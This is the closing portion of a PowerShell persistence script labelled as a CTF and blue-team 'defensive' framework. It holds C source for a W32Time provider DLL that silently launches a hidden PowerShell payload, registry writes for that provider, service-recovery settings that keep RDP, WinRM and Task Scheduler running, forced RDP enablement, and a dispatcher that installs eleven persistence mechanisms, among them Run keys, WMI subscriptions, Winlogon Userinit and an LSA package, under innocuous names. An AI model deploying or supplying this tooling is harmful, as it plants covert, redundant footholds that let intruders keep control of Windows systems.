#  typedef HANDLE TimeProvHandle;
#  typedef DWORD  TimeSysFlags;
#
#  // Called when W32Time loads the provider
#  __declspec(dllexport)
#  TimeProvHandle WINAPI TimeProvOpen(WCHAR *name, void *pSysCallbacks,
#                                      TimeSysFlags flags) {
#      STARTUPINFOW si = { sizeof(si) };
#      PROCESS_INFORMATION pi;
#      WCHAR cmd[] = L"powershell.exe -NonInteractive -WindowStyle Hidden "
#                    L"-ExecutionPolicy Bypass -File "
#                    L"\"C:\\ProgramData\\SvcHealthMonitor\\keepalive.ps1\"";
#      CreateProcessW(NULL, cmd, NULL, NULL, FALSE,
#                     DETACHED_PROCESS | CREATE_NO_WINDOW,
#                     NULL, NULL, &si, &pi);
#      CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
#      return (TimeProvHandle)1;  // non-NULL = success
#  }
#
#  __declspec(dllexport)
#  DWORD WINAPI TimeProvCommand(TimeProvHandle h, DWORD cmd, void *pData) {
#      return 0;  // ERROR_SUCCESS
#  }
#
#  __declspec(dllexport)
#  DWORD WINAPI TimeProvClose(TimeProvHandle h) { return 0; }
#
#  BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID l) { return TRUE; }
#  ─────────────────────────────────────────────────────────────────────────────
#  Compile: cl /LD SvcHealthMonTimeProv.c
#  No .def needed — __declspec(dllexport) handles exports
#  Then restart W32Time: net stop w32time && net start w32time
#  Or reboot — W32Time starts automatically at boot
#  ─────────────────────────────────────────────────────────────────────────────
# ─────────────────────────────────────────────────────────────────
function Install-TimeProvider {
    Write-Warn "Time Provider: compile SvcHealthMonTimeProv.dll from the skeleton above, then place at:"
    Write-Warn "  $($Script:Config.DropDir)\SvcHealthMonTimeProv.dll"
    Write-Warn "  Restart W32Time (or reboot) to activate. Registry skeleton being written now."
    $keyPath = "$($Script:Config.TimeProv)\NtpClientAux"
    try {
        if (-not (Test-Path $keyPath)) { New-Item -Path $keyPath -Force | Out-Null }
        Set-ItemProperty -Path $keyPath -Name DllName      -Value "$($Script:Config.DropDir)\w32tmaux.dll" -Type String -Force
        Set-ItemProperty -Path $keyPath -Name Enabled      -Value 1 -Type DWord -Force
        Set-ItemProperty -Path $keyPath -Name InputProvider -Value 0 -Type DWord -Force
        Write-Status "Time Provider registry skeleton written (needs DLL to activate)"
    } catch { Write-Err "Time Provider failed: $_" }
}
function Remove-TimeProvider {
    $keyPath = "$($Script:Config.TimeProv)\NtpClientAux"
    if (Test-Path $keyPath) {
        Remove-Item $keyPath -Recurse -Force
        Write-Status "Removed Time Provider registry entry"
    }
}

# ─────────────────────────────────────────────────────────────────
#  MECHANISM 11 – WINDOWS SERVICE FAILURE / RECOVERY ACTIONS
#
#  How it works:
#    Every Windows service has a built-in failure recovery policy managed
#    by the Service Control Manager (SCM). You configure it with sc.exe:
#
#      sc failure <svc> reset= <seconds> actions= <action/delay,...>
#
#    Actions: "restart" restarts the service, "reboot" reboots the machine,
#    "run" executes an arbitrary program. Delay is in milliseconds.
#    reset= sets how long after the last failure the counter resets to 0.
#
#    The critical flag that makes this powerful for defenders:
#
#      sc failureflag <svc> 1
#
#    By default, recovery only triggers on abnormal exits (non-zero exit code
#    or crash). Setting failureflag to 1 means recovery also fires when the
#    service is stopped normally — including via "net stop", Stop-Service,
#    or the Services MMC snap-in. An attacker who stops RDP will find it
#    restarted by the SCM within 1 second using only native Windows machinery.
#
#  What the script does:
#    Applies to: TermService (RDP), WinRM (PS remoting), Schedule (Task Scheduler)
#    Sets:  restart after 1 000 ms on 1st, 2nd, and 3rd+ failures
#           failureflag = 1 (trigger on clean stop too)
#           reset counter after 86 400 s (24 h)
#
#  Verify with:
#    sc qfailure TermService    — shows current failure actions
#    sc qfailureflag TermService — shows failureflag value
#
#  Caveat:
#    An attacker with sufficient privileges can disable this with:
#      sc failure TermService reset= 0 actions= ""
#      sc failureflag TermService 0
#    But they need to know to do it — and your other 10 mechanisms
#    will still be running while they figure that out.
# ─────────────────────────────────────────────────────────────────
function Install-ServiceRecovery {
    $targets = @("TermService", "WinRM", "Schedule")
    foreach ($svc in $targets) {
        try {
            # sc.exe failure: reset counter after 1 day, restart after 1s every time
            $null = sc.exe failure $svc reset= 86400 actions= restart/1000/restart/1000/restart/1000
            # sc.exe failureflag 1: apply recovery even on clean exits (not just crashes)
            $null = sc.exe failureflag $svc 1
            Write-Status "Failure recovery set on service: $svc (auto-restart on any stop)"
        } catch { Write-Err "ServiceRecovery for $svc failed: $_" }
    }
}
function Remove-ServiceRecovery {
    $targets = @("TermService", "WinRM", "Schedule")
    foreach ($svc in $targets) {
        try {
            $null = sc.exe failure $svc reset= 0 actions= ""
            $null = sc.exe failureflag $svc 0
            Write-Status "Cleared failure recovery for: $svc"
        } catch { Write-Warn "Could not clear recovery for $svc" }
    }
}

# ─────────────────────────────────────────────────────────────────
#  BONUS: ENABLE RDP RIGHT NOW
#  Does not require a reboot — takes effect immediately.
# ─────────────────────────────────────────────────────────────────
function Enable-RDPNow {
    Write-Host "`n[*] Enabling RDP immediately..." -ForegroundColor Magenta
    try {
        Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" `
            -Name fDenyTSConnections -Value 0 -Type DWord -Force
        Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" `
            -Name UserAuthentication -Value 1 -Type DWord -Force
        Enable-NetFirewallRule -DisplayGroup "Remote Desktop" -ErrorAction SilentlyContinue
        Set-Service -Name TermService -StartupType Automatic
        Start-Service -Name TermService
        Write-Status "RDP enabled and TermService started."
    } catch { Write-Err "Could not fully enable RDP: $_" }
}

# ─────────────────────────────────────────────────────────────────
#  MAIN DISPATCHER
# ─────────────────────────────────────────────────────────────────
$MechanismMap = @{
    1  = @{ Install = { Install-SchedTasks };      Remove = { Remove-SchedTasks };      Name = "Scheduled Tasks (3 triggers)" }
    2  = @{ Install = { Install-RegRunKey };       Remove = { Remove-RegRunKey };       Name = "Registry Run Key (HKLM)" }
    3  = @{ Install = { Install-RegRunOnce };      Remove = { Remove-RegRunOnce };      Name = "Registry RunOnce (self-replicating)" }
    4  = @{ Install = { Install-WinService };      Remove = { Remove-WinService };      Name = "Windows Service" }
    5  = @{ Install = { Install-WMISubscription }; Remove = { Remove-WMISubscription }; Name = "WMI Permanent Event Subscription" }
    6  = @{ Install = { Install-StartupFolder };   Remove = { Remove-StartupFolder };   Name = "All-Users Startup Folder" }
    7  = @{ Install = { Install-WinlogonUserinit };Remove = { Remove-WinlogonUserinit };Name = "Winlogon Userinit Key" }
    8  = @{ Install = { Install-BITSJob };         Remove = { Remove-BITSJob };         Name = "BITS Job (NotifyProgram)" }
    9  = @{ Install = { Install-LSAPackage };      Remove = { Remove-LSAPackage };      Name = "LSA Notification Package (requires DLL)" }
    10 = @{ Install = { Install-TimeProvider };    Remove = { Remove-TimeProvider };    Name = "W32Time Time Provider (requires DLL)" }
    11 = @{ Install = { Install-ServiceRecovery }; Remove = { Remove-ServiceRecovery }; Name = "Service Recovery / Failure Actions" }
}

function Show-Banner {
    Write-Host @"

╔══════════════════════════════════════════════════════════════╗
║     Defensive Persistence Framework — CTF / Blue Team        ║
║     Installs redundant mechanisms to retain service access   ║
╚══════════════════════════════════════════════════════════════╝
"@ -ForegroundColor Cyan
}

function Show-Summary {
    Write-Host "`n[*] Mechanisms available:" -ForegroundColor White
    foreach ($k in ($MechanismMap.Keys | Sort-Object)) {
        $marker = if ($Mechanisms -contains $k) { "✓" } else { "○" }
        Write-Host "    [$marker] $k. $($MechanismMap[$k].Name)" -ForegroundColor $(if ($Mechanisms -contains $k) { "Green" } else { "DarkGray" })
    }
    Write-Host ""
}

if (-not $Install -and -not $Remove) {
    Show-Banner
    Write-Host "Usage:" -ForegroundColor Yellow
    Write-Host "  Install all:  .\Invoke-PersistenceFramework.ps1 -Install"
    Write-Host "  Install some: .\Invoke-PersistenceFramework.ps1 -Install -Mechanisms 1,2,5,12"
    Write-Host "  Remove all:   .\Invoke-PersistenceFramework.ps1 -Remove"
    Write-Host "  Custom path:  .\Invoke-PersistenceFramework.ps1 -Install -PayloadPath C:\myagent.exe"
    Show-Summary
    exit 0
}

Show-Banner

if ($Install) {
    Write-Host "[*] Installing persistence mechanisms..." -ForegroundColor White
    Stage-Payload
    Enable-RDPNow

    foreach ($num in ($Mechanisms | Sort-Object)) {
        if ($MechanismMap.ContainsKey($num)) {
            Write-Host "`n[*] Mechanism $num — $($MechanismMap[$num].Name)" -ForegroundColor White
            & $MechanismMap[$num].Install
        }
    }
    Write-Host "`n[+] All selected mechanisms installed." -ForegroundColor Green
    Write-Host "    Keepalive payload: $(Get-PayloadPath)"  -ForegroundColor Green
    Write-Host "    Logs:              $($Script:Config.DropDir)\svc.log`n" -ForegroundColor Green
}

if ($Remove) {
    Write-Host "[*] Removing persistence mechanisms..." -ForegroundColor White
    foreach ($num in ($Mechanisms | Sort-Object)) {
        if ($MechanismMap.ContainsKey($num)) {
            Write-Host "`n[*] Removing Mechanism $num — $($MechanismMap[$num].Name)" -ForegroundColor White
            & $MechanismMap[$num].Remove
        }
    }
    # Remove drop dir last
    if (Test-Path $Script:Config.DropDir) {
        Remove-Item $Script:Config.DropDir -Recurse -Force -ErrorAction SilentlyContinue
        Write-Status "Removed drop directory: $($Script:Config.DropDir)"
    }
    Write-Host "`n[+] Cleanup complete.`n" -ForegroundColor Green
}